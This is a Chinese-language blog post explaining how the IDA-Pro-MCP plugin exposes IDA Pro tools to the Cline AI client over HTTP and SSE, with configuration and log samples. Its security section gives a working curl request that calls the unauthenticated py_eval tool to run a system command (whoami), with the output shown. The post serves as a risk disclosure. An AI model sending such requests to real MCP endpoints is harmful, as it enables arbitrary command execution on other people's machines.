---
title: "MCP 原理（IDA-Pro-MCP 为例）"
date: 2026-05-24T13:00:00+08:00
draft: false
author: "偶记"
categories: ["逆向"]
tags: ["MCP", "IDA Pro", "Cline", "SSE", "逆向工程"]
---


Cline是vscode上调用AI的插件。

要让 AI（Cline）调用 IDA，需要**两端配置**：

+ **Server 端**（IDA + ida_mcp）：负责暴露 IDA 的各种功能给 AI
+ **Client 端**（Cline）：负责连接 Server 并把工具告诉 AI

# Server 端配置（IDA 这边）
位置：%APPDATA%\Hex-Rays\IDA Pro\plugins

+ ida_mcp.py → 主插件文件（入口）
+ ida_mcp 文件夹 → 插件的依赖和核心代码

启动方式：

1. **启动 MCP Server**（必须手动启动）
    - 打开 IDA + 加载 IDB
    - 按快捷键 **Ctrl + Alt + M**
    - 或者菜单：**Edit → Plugins → MCP**
2. **MCP Server 运行时的关键信息**（启动后会在 IDA 输出窗口看到）：
    - 默认监听端口：**13337**

```shell
[MCP] Cached 18 strings in 4ms
[MCP] Server started:
  Streamable HTTP: http://127.0.0.1:13337/mcp
  SSE: http://127.0.0.1:13337/sse
  Config: http://127.0.0.1:13337/config.html
```

# Client 端配置（Cline 这边）
```shell
{
  "mcpServers": {
    "ida-pro": {
      "disabled": false,
      "timeout": 60,
      "type": "sse",
      "url": "http://127.0.0.1:13337/sse"
    }
  }
}
```

```shell

[MCP] >> initialize({"protocolVersion": "2025-11-25", "capabilities": {},
"clientInfo": {"name": "Cline", "version": "3.84.0"}})

[MCP] << initialize (0.2ms) {"protocolVersion": "2024-11-05", "capabilities": 
{"tools": {}, "resources": 
{"subscribe": false, "listChanged": false}, "prompts": {}}, 
"serverInfo": {"name": "ida-pro-mcp", "version": "1.0.0"}}
```

# SEE（Server-Sent Events）
SSE 是一种**服务器推送技术**，其核心特点是：

**服务器可以主动向客户端推送消息，而不需要客户端不断轮询。**

MCP 协议实际采用的是 **“HTTP + SSE” 混合模式**：

+ **Cline → IDA**（客户端发起请求）：使用普通的 **HTTP POST**
+ **IDA → Cline**（服务器返回结果）：通过 **SSE 长连接** 进行流式推送

这种设计非常适合 AI 工具调用场景，尤其是反编译、分析大量函数等需要返回较多数据的操作。

# 安全风险
访问 http://127.0.0.1:13337/config.html 可以看到 MCP 暴露的所有工具，其中包括高危接口如：

+ py_eval：在 IDA Python 环境中执行任意代码
+ patch*：修改二进制代码
+ 各种调试器接口等

即使设置了 🏠 Local apps only，只要攻击者能够在本机或局域网内发送 HTTP 请求到 13337 端口，就可以构造请求调用 py_eval 执行系统命令：

```shell
Time>curl -X POST http://127.0.0.1:13337/mcp -H "Content-Type: application/json" -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"py_eval\",\"arguments\":{\"code\":\"import os\nprint(os.popen('whoami').read())\"}}}"
{"jsonrpc": "2.0", "result": {"content": [{"type": "text", "text": "{\n  \"result\": \"None\",\n  \"stdout\": \"doraemon\\\\lihao\\n\\n\",\n  \"stderr\": \"\"\n}"}], "structuredContent": {"result": "None", "stdout": "doraemon\\***\n\n", "stderr": ""}, "isError": false}, "id": 1}
```



